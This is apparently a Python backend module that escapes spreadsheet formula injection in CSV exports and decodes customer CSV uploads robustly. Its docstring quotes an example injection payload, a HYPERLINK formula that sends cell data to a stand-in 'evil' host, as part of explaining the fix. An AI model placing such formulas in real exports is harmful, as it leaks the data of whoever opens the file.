"""AMP's CSV boundary — safe on the way out, forgiving on the way in.

OUT (`csv_response` / `csv_text`): formula injection neutralized.
IN (`read_upload_text`): a real customer's file decoded without a 500.

`csv.writer` escapes commas, quotes and newlines correctly, but it deliberately
does NOT touch a cell like ``=HYPERLINK("http://evil/?x="&A1,"Report")``. That
is still a perfectly valid CSV *string* — the danger only appears when a human
opens the file, because Excel, LibreOffice and Google Sheets treat a leading
``=``, ``+``, ``-`` or ``@`` as the start of a formula and evaluate it.

That matters here because AMP's exports are full of text one tenant's users type
and another user later opens: machine names, downtime notes, part numbers,
supplier and customer names, escalation titles. An Operator who types a formula
into a downtime note is writing code that runs on the Admin's workstation when
they export and open the report — data exfiltration via HYPERLINK/WEBSERVICE, or
worse on legacy Excel with DDE enabled.

The fix is the standard one (OWASP "CSV Injection"): prefix a risky cell with a
single quote, which spreadsheets strip on display and never evaluate. Numbers are
left alone — a negative quantity must stay ``-5``, not become ``'-5`` — so the
escape only applies to strings that are not plain numbers.

Every CSV surface in the backend routes through here, and
`test_csv_injection.py` asserts no module calls `csv.writer` on its own, so a new
export cannot quietly reintroduce the hole.

On the import side the problem is the opposite — not malice, just reality. Every
importer decoded uploads as ``content.decode("utf-8-sig")`` with nothing around
it, and "Save as CSV" in Excel on Windows writes the system ANSI codepage
(usually cp1252), not UTF-8. So the moment a roster contained "Müller Press" or a
supplier was "Nováková s.r.o.", the decode raised UnicodeDecodeError and the
onboarding import returned HTTP 500 — on the very first thing a new customer
does, with no hint about what was wrong. `read_upload_text` decodes what real
spreadsheets actually produce, turns the genuinely unreadable cases into a 400
that says what to fix, and bounds the read so a huge upload cannot exhaust the
container's memory.
"""
import csv
import io

from fastapi import HTTPException, Response

# Leading characters a spreadsheet reads as "this cell is a formula".
# Tab and CR are included because Excel strips leading whitespace before
# deciding, so "\t=cmd" is still a formula.
RISKY_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


def _is_number(text: str) -> bool:
    """True for a plain numeric literal — those must survive unescaped."""
    try:
        float(text)
        return True
    except (TypeError, ValueError):
        return False


def safe_cell(value):
    """Neutralize one cell. Non-strings pass through untouched (an int or a
    datetime cannot carry a formula), as do plain numbers written as text."""
    if not isinstance(value, str):
        return value
    if not value.startswith(RISKY_PREFIXES):
        return value
    if _is_number(value):
        return value                      # "-5", "+3.2" are data, not formulas
    return "'" + value


def safe_row(row):
    return [safe_cell(v) for v in row]


def csv_text(headers, rows) -> str:
    """CSV text with every cell neutralized. An empty `rows` yields a
    header-only document rather than an error — callers rely on that."""
    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(safe_row(headers))
    writer.writerows(safe_row(r) for r in rows)
    return output.getvalue()


def csv_response(headers, rows, filename) -> Response:
    """The download response for an export endpoint."""
    return Response(
        content=csv_text(headers, rows),
        media_type="text/csv",
        headers={"Content-Disposition": f"attachment; filename={filename}"},
    )


# ── Import side ─────────────────────────────────────────────────────

# Bounds the in-memory read. An onboarding roster is kilobytes; 10 MB is orders
# of magnitude of headroom while still refusing a file that would sit in RAM on
# a small container.
MAX_UPLOAD_BYTES = 10 * 1024 * 1024

# Encodings actually produced by the tools customers export from, in the order
# worth trying. latin-1 decodes any byte sequence, so it is the backstop that
# guarantees we never raise — which is why the binary check happens first.
CSV_ENCODINGS = ("utf-8-sig", "cp1252", "latin-1")

# Uploading the .xlsx instead of exporting to CSV is the most common onboarding
# mistake, and the bytes are recognisable: xlsx/ods are zip archives, legacy
# .xls is an OLE compound file. Saying so beats "invalid character at byte 18".
_SPREADSHEET_MAGIC = {
    b"PK\x03\x04": "an Excel/OpenDocument workbook (.xlsx/.ods)",
    b"\xd0\xcf\x11\xe0": "a legacy Excel workbook (.xls)",
}


def decode_csv_bytes(content: bytes):
    """(text, encoding_used). Tries the encodings real spreadsheets emit."""
    for encoding in CSV_ENCODINGS:
        try:
            return content.decode(encoding), encoding
        except UnicodeDecodeError:
            continue
    # latin-1 maps every byte, so this is unreachable — kept so a future edit to
    # CSV_ENCODINGS degrades to a 400 rather than an uncaught exception.
    raise HTTPException(status_code=400,
                        detail="Could not read this file as text. Save it as CSV (UTF-8) and try again.")


async def read_upload_text(file, max_bytes: int = MAX_UPLOAD_BYTES):
    """Read an uploaded CSV into text, or fail with a 400 the user can act on.

    Returns (text, encoding_used) so the caller can tell the user how the file
    was read — mojibake is much easier to diagnose when the response says
    "cp1252" than when it silently guessed."""
    content = await file.read()

    if len(content) > max_bytes:
        raise HTTPException(
            status_code=400,
            detail=f"File is too large ({len(content) // 1024} KB). "
                   f"The limit is {max_bytes // (1024 * 1024)} MB — split the file and import in batches.")

    if not content.strip():
        raise HTTPException(status_code=400, detail="The uploaded file is empty.")

    for magic, description in _SPREADSHEET_MAGIC.items():
        if content.startswith(magic):
            raise HTTPException(
                status_code=400,
                detail=f"This looks like {description}, not a CSV. "
                       f"In Excel choose File > Save As and pick CSV, then upload that.")

    return decode_csv_bytes(content)


# ── Per-row import failures ─────────────────────────────────────────

def import_row_error(exc) -> str:
    """A readable one-line reason a row could not be applied.

    SQLAlchemy str()s a database error into a multi-line dump: the message, then
    the whole INSERT, then its bound parameters. Those parameters are the row the
    customer just uploaded, so echoing the dump into a response both buries the
    reason and hands their data back to them inside an error string:

        (sqlite3.IntegrityError) UNIQUE constraint failed: inventory_items.item_code
        [SQL: INSERT INTO inventory_items (tenant_code, item_code, ...) VALUES (?, ...)]
        [parameters: ('BETA', 'WIDGET', 'Beta widget', ...)]

    Two things guard that, and on SQLite they are redundant with each other —
    mutation testing established it rather than guesswork. Removing EITHER alone
    fails no test; removing BOTH leaks the dump, and that is caught:

      * `.orig` is the driver's own message. On sqlite3 it is already one line,
        so it alone suffices there.
      * taking the FIRST LINE alone also suffices, since the SQL and parameters
        are on the lines below.

    Keep both, because SQLite is hiding the case that matters. psycopg2's `.orig`
    is MULTI-line — the message, then a DETAIL line that quotes the offending key
    back verbatim ("Key (item_code)=(WIDGET) already exists"). On Postgres the
    first-line take is the part doing the work, and the local test database can
    never show that. Same class of blind spot as the GROUP BY ordering and NULL
    three-valued logic this codebase has been caught by before.

    Non-database errors (a bad number, a missing column) have no .orig and pass
    through unchanged, since their str() is already the message.
    """
    orig = getattr(exc, "orig", None)
    text = str(orig if orig is not None else exc).strip()
    return (text.split("\n")[0] or exc.__class__.__name__)[:200]
